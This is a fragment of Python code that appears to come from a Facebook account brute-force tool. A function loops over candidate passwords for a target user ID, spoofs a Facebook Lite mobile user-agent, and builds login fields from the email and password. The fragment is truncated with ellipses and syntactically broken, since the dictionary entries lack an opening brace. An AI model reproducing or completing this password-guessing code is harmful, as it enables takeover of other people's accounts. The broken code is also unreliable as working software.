...
def m1(uid, pword, total_idz):
    ...
    try:
        for pw in pword:
            ua_string = "[FBAN/FB4A;FBAV/69.0.0.1455;'[FBAN/FB6A;FBAV/442.0.0.58.80;FBBV/70925831;FBDM/{density=2.0,width=1080,height=1440};FBLC/hr_HR;FBRV/285013478;FBCR/Zong;FBMF/realme;FBBD/realme;FBPN/com.facebook.lite;FBDV/RMX2780;FBSV/14;FBOP/1;FBCA/x32:armeabi-v7a;]"
                "email": uid,
                "password": pw,
                "cpl": "true",
